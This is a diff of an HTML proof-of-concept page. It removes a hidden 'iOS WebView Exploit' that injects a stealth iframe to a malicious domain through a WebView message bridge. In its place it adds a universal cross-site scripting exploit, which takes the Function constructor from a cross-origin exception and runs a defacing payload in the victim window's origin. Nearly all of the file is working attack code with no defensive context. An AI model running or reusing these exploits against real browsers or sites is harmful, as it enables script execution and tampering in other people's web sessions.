@@ -1,44 +1,125 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iOS WebView Exploit</title>
-</head>
-<body style="opacity: 0">
-    <script>
-        // Inject JavaScript into WebView environment
-        const executeInNativeWebView = function() {
-            if (window.webkit && window.webkit.messageHandlers) {
-                // Assuming the app has exposed a message handler for JS execution in WebView
-                const injectScript = `
-                    var iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';  // Hide iframe for stealth
-                    iframe.src = 'https://malicious.com';  // Target malicious domain
+<body style="background:#111;color:#0f0;font-family:monospace;">
+<script>
 
-                    iframe.onload = function() {
-                        try {
-                            iframe.contentWindow.document.body.innerHTML = "<h1>Injected from WebView!</h1>";
-                            iframe.contentWindow.opener = window; // Cross-origin attempt to access parent
-                        } catch (e) {
-                            console.error('Cross-origin blocking', e);
-                        }
-                    };
+// ==============================
+// CONFIG
+// ==============================
+var TARGET_URL = "https://example.com";
+var DELAY = 1500;
 
-                    document.body.appendChild(iframe);
-                `;
+// ==============================
+// UTILS
+// ==============================
+function log(msg) {
+    console.log("[POC] " + msg);
+}
 
-                // Send the JavaScript to the native app via WebView bridge
-                window.webkit.messageHandlers.executeJS.postMessage(injectScript);
+function safeExec(fn) {
+    try {
+        fn();
+    } catch (e) {
+        log("Error: " + e);
+    }
+}
 
-                console.log("JavaScript injection sent to WebView.");
-            } else {
-                console.log("WebView bridge not found.");
-            }
-        };
+// ==============================
+// STEP 1: OPEN TARGET WINDOW
+// ==============================
+function openTarget() {
+    log("Opening target window...");
+    var w = window.open(TARGET_URL);
 
-        // Delay to ensure the WebView is ready
-        setTimeout(executeInNativeWebView, 1000);
-    </script>
+    if (!w) {
+        alert("Popup blocked!");
+        return null;
+    }
+
+    return w;
+}
+
+// ==============================
+// STEP 2: TRIGGER EXCEPTION
+// ==============================
+function triggerException(victim) {
+    log("Triggering cross-origin exception...");
+
+    try {
+        // Force exception via cross-origin call
+        location.assign.call(victim.location);
+    } catch (e) {
+        log("Exception captured ✔");
+        return e;
+    }
+
+    log("No exception ❌");
+    return null;
+}
+
+// ==============================
+// STEP 3: EXTRACT FUNCTION
+// ==============================
+function extractFunction(exceptionObject) {
+    log("Extracting Function constructor...");
+
+    try {
+        var func = exceptionObject.constructor.constructor;
+        log("Function extracted ✔");
+        return func;
+    } catch (err) {
+        log("Extraction failed ❌");
+        return null;
+    }
+}
+
+// ==============================
+// STEP 4: EXECUTE PAYLOAD
+// ==============================
+function executePayload(func) {
+    log("Executing payload in victim context...");
+
+    safeExec(function() {
+        func(`
+            alert("UXSS SUCCESS\\nOrigin: " + location.origin);
+
+            document.body.innerHTML = "<h1 style='color:red'>PWNED</h1>";
+
+            document.title = "Owned by UXSS";
+
+            console.log("Executed inside:", location.href);
+        `)();
+    });
+}
+
+// ==============================
+// MAIN FLOW
+// ==============================
+function runPoC() {
+    log("Starting PoC...");
+
+    var victim = openTarget();
+    if (!victim) return;
+
+    setTimeout(function() {
+
+        var ex = triggerException(victim);
+        if (!ex) return;
+
+        var func = extractFunction(ex);
+        if (!func) return;
+
+        executePayload(func);
+
+    }, DELAY);
+}
+
+// ==============================
+// START
+// ==============================
+runPoC();
+
+</script>
+
+<h2>UXSS PoC Running...</h2>
+<p>Check popup & console output</p>
+
 </body>
-</html>
